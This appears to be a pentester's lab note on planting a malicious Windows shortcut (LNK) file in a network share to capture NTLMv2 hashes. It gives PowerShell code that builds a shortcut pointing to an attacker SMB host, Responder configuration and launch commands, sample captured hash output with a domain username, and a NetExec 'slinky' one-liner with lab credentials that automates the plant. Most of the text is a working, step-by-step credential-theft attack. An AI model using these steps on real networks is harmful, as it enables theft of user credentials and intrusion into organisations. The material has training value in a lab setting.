#PowerShell #LNK #Responder 
Placing a malicious file in a shared folder can lead to some great results.
Capture hashes through responder

Step 1: generate file via PowerShell 
- IP is attacker ip, RUN PowerShell AS ADMIN, Enter each line one at a time
```
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.95.130\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

Step 2: rename file and put in file share
- rename file from `test` to `@test` just so it shows first in order and hash can be returned back
- Put it into file share
	- we just copy and pasted it to file share named "hackme" that we created earlier

Step 3: Start Responder
`sudo responder -I eth0 -dP`
- make sure smb and http are enabled in responder
`cd /usr/share/responder`
`sudo nano Responder.conf`
Change SMB and HTTP to `ON`

Step 4: Navigate to file share and load the LNK file
- relies on user to go to file share, once the LNK file is visible on their file explorer in file share, we will see captured hashes

```
[*] [DHCP] Found DHCP server IP: 192.168.95.254, now waiting for incoming requests...
[SMB] NTLMv2-SSP Client   : 192.168.95.133
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:c4f14b6628c46d17:E74552EA0F262800841314A19E51A277:010100000000000000F3F8ED3FCDDA01B705AAC68B6B80E20000000002000800340035004700470001001E00570049004E002D004400570044004E0059004C005A00500057004F00370004003400570049004E002D004400570044004E0059004C005A00500057004F0037002E0034003500470047002E004C004F00430041004C000300140034003500470047002E004C004F00430041004C000500140034003500470047002E004C004F00430041004C000700080000F3F8ED3FCDDA0106000400020000000800300030000000000000000100000000200000C8056E6645FACE89CB804D9C074A0160DEE0A4FC59C82B596070CA0538C0B94D0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390035002E003100330030000000000000000000              
```


# Automated attack using CME/NetExec:

netexec smb 192.168.95.133 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.95.130